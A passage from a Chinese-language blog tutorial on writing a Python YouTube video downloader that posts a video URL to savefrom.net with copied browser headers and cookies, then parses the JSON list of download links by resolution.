class="string">&quot;video_quality&quot;</span>:[<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;720&quot;</span>,<span class="string">&quot;480&quot;</span>,<span class="string">&quot;360&quot;</span>,<span class="string">&quot;240&quot;</span>,<span class="string">&quot;144&quot;</span>],<span class="string">&quot;url&quot;</span>:[&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=18&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;gir=yes&amp;clen=35202709&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603720879883261&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5531422&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgN_iBsjO6zSiW9dcOYYExfjeVuy1YCXtWcKT0cz2kMcECIQCMre2rssbqkWdohk9K4Ej8B8r9gARVc0-kAHVqhV1teQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;360&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=18&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;gir=yes&amp;clen=35202709&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603720879883261&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5531422&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgN_iBsjO6zSiW9dcOYYExfjeVuy1YCXtWcKT0cz2kMcECIQCMre2rssbqkWdohk9K4Ej8B8r9gARVc0-kAHVqhV1teQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;360&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;18&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">35202709</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 360&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;0c41b67f74ccb97e50f2e64fe5f4625a&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=22&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603723118280830&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5535432&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgWg_KEKuXDFH-OcphoOxU2tjE9B0WnidilKpa-vtbmigCIQD-eJlhFHZMi1VzRYI_jh0RZaMiLkkXYWnwGM2TJp0bLA%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&amp;title=The%20Most%20Genius%20Plays%20in%20Football&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;720&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=22&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603723118280830&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5535432&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgWg_KEKuXDFH-OcphoOxU2tjE9B0WnidilKpa-vtbmigCIQD-eJlhFHZMi1VzRYI_jh0RZaMiLkkXYWnwGM2TJp0bLA%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;720&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;22&quot;</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 720&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;674fa89ee246148990b3f36e750a5d32&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=137&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=177708494&amp;dur=422.999&amp;lmt=1603723164407782&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIhANMFMA1ypwGQjiGT_DlqlYwfqcqu1IlKZGoCrdIqWmzHAiAyOJJHIzUBcMQ6WBeEnepV4UlD3TY6rGSNKBVSVhbpIQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=137&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=177708494&amp;dur=422.999&amp;lmt=1603723164407782&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIhANMFMA1ypwGQjiGT_DlqlYwfqcqu1IlKZGoCrdIqWmzHAiAyOJJHIzUBcMQ6WBeEnepV4UlD3TY6rGSNKBVSVhbpIQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4 dash&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;137&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">177708494</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 1080 (without audio)&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;no-audio&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;6816215e43020185bb429874c33f1f73&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=248&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fwebm&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=117037047&amp;dur=422.999&amp;lmt=1603725149388225&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRgIhANFyBfTGjhDMawSTzN1NjLLYLztYc8e6w3lXVXY5ldbxAiEA-UBT6Yb33Sr0Yhan0x9xlf1xVWFH-wu_y2HsgWkiuXo%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;WEBM&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=248&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fwebm&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=117037047&amp;dur=422.999&amp;lmt=1603725149388225&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRgIhANFyBfTGjhDMawSTzN1NjLLYLztYc8e6w3lXVXY5ldbxAiEA-UBT6Yb33Sr0Yhan0x9xlf1xVWFH-wu_y2HsgWkiuXo%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;webm dash&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;webm&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;248&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">117037047</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 1080 (without audio)&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;no-audio&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;43e803aa40437c9930975615121cc2c5&quot;</span>&#125;],<span class="string">&quot;hosting&quot;</span>:<span class="number">101</span>,<span class="string">&quot;srv&quot;</span>:<span class="string">&quot;s30&quot;</span>,<span class="string">&quot;sd&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;hd&quot;</span>:<span class="literal">null</span>&#125;);;</span><br></pre></td></tr></table></figure><p>这里面有一长串json文本然后里面就包含我们要的下载链接和其他杂七杂八的东西，在json格式化平台(比如<a href="http://www.bejson.com/jsonviewernew/">bejson</a>)把这一段json文本输入<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-11.png" alt="json"><br>可以发现<code>meta</code>主要是视频消息，然后<code>url</code>下就是不同分辨率的视频下载链接了</p><blockquote><p>最后代码+注释大概100行左右，具体代码以github代码为主，本文只做具体讲解</p></blockquote><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Nambers/YoutubeDownloader">github仓库</a></p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="1-post"><a href="#1-post" class="headerlink" title="1. post"></a>1. post</h3><p>根据思路里的第一步，我们首先需要用<code>post</code>方式取到加密后的js字段，笔者使用了<code>requests</code>第三方库来执行，关于爬虫可以参考<a href="https://blog.csdn.net/qq_40832960/article/details/103854145">我之前的文章</a></p><h4 id="i-先把post中的headers格式化"><a href="#i-先把post中的headers格式化" class="headerlink" title="i. 先把post中的headers格式化"></a>i. 先把post中的headers格式化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set the headers or the website will not return information</span></span><br><span class="line">    <span class="comment"># the cookies in here you may need to change</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&quot;</span></span><br><span class="line">                  <span class="string">&quot;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;lang=en; country=CN; uid=fd94a82a406a8dd4; sfHelperDist=72; reference=14; &quot;</span></span><br><span class="line">                  <span class="string">&quot;clickads-e2=90; poropellerAdsPush-e=63; promoBlock=64; helperWidget=92; &quot;</span></span><br><span class="line">                  <span class="string">&quot;helperBanner=42; framelessHdConverter=68; inpagePush2=68; popupInOutput=9; &quot;</span></span><br><span class="line">                  <span class="string">&quot;_ga=GA1.2.799702638.1610248969; _gid=GA1.2.628904587.1610248969; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSID=030393eb0776d20d0975f99b523a70d4; x-requested-with=; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSUD=islilfjn5alth33j9j8glj9776; _gat_helperWidget=1; _gat_inpagePush2=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://en.savefrom.net&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://en.savefrom.net/1-youtube-video-downloader-4/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;87\&quot;, \&quot;Not;A Brand\&quot;;v=\&quot;99\&quot;,\&quot;Chromium\&quot;;v=\&quot;87\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-dest&quot;</span>: <span class="string">&quot;iframe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-user&quot;</span>: <span class="string">&quot;?1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;upgrade-insecure-requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/87.0.4280.88 Safari/537.36&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>其中<code>cookie</code>部分可能要改，然后最好以你们浏览器上的为主，具体每个参数的含义不是本文范围，可以自行去搜索引擎搜</p><h4 id="ii-然后把参数也格式化"><a href="#ii-然后把参数也格式化" class="headerlink" title="ii.然后把参数也格式化"></a>ii.然后把参数也格式化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set the parameter, we can get from chrome</span></span><br><span class="line">    kv = &#123;<span class="string">&quot;sf_url&quot;</span>: url,</span><br><span class="line">          <span class="string">&quot;sf_submit&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;new&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">          <span class="string">&quot;lang&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">          <span class="string">&quot;app&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;country&quot;</span>: <span class="string">&quot;cn&quot;</span>,</span><br><span class="line">          <span class="string">&quot;os&quot;</span>: <span class="string">&quot;Windows&quot;</span>,</span><br><span class="line">          <span class="string">&quot;browser&quot;</span>: <span class="string">&quot;Chrome&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>其中<code>sf_url</code>字段是我们要下载的youtube视频的url，其他参数都不变</p><h4 id="iii-最后再执行requests库的post请求"><a href="#iii-最后再执行requests库的post请求" class="headerlink" title="iii. 最后再执行requests库的post请求"></a>iii. 最后再执行<code>requests</code>库的post请求</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># do the POST request</span></span><br><span class="line">    r = requests.post(url=<span class="string">&quot;https://en.savefrom.net/savefrom.php&quot;</span>, headers=headers,</span><br><span class="line">                      data=kv)</span><br><span class="line">    r.raise_for_status()</span><br></pre></td></tr></table></figure><p>注意是<code>data=kv</code></p><h4 id="iv-封装成一个函数"><a href="#iv-封装成一个函数" class="headerlink" title="iv. 封装成一个函数"></a>iv. 封装成一个函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethtml</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># set the headers or the website will not return information</span></span><br><span class="line">    <span class="comment"># the cookies in here you may need to change</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&quot;</span></span><br><span class="line">                  <span class="string">&quot;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;lang=en; country=CN; uid=fd94a82a406a8dd4; sfHelperDist=72; reference=14; &quot;</span></span><br><span class="line">                  <span class="string">&quot;clickads-e2=90; poropellerAdsPush-e=63; promoBlock=64; helperWidget=92; &quot;</span></span><br><span class="line">                  <span class="string">&quot;helperBanner=42; framelessHdConverter=68; inpagePush2=68; popupInOutput=9; &quot;</span></span><br><span class="line">                  <span class="string">&quot;_ga=GA1.2.799702638.1610248969; _gid=GA1.2.628904587.1610248969; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSID=030393eb0776d20d0975f99b523a70d4; x-requested-with=; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSUD=islilfjn5alth33j9j8glj9776; _gat_helperWidget=1; _gat_inpagePush2=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://en.savefrom.net&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://en.savefrom.net/1-youtube-video-downloader-4/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua&quot;</span>: <span 